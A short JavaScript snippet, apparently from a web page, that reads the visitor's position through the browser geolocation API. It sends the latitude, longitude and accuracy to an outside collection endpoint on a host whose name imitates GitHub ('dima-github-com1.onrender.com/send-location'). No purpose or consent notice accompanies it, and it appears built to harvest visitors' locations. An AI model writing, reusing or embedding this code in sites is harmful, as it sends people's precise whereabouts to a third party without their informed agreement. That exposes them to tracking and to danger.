navigator.geolocation.getCurrentPosition(function(position) {
  fetch('https://dima-github-com1.onrender.com/send-location', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy
    })
  });
});
